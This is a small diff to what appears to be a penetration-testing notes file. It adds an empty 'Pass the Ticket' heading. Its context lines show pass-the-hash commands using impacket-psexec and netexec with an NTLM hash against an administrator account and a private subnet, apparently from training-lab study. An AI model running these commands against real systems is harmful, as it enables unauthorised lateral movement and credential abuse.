@@ -245,3 +245,10 @@ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660
 # netexec
 nxc smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
 ```
+
+# Pass the Ticket
+
+## Windows
+
+```
+```
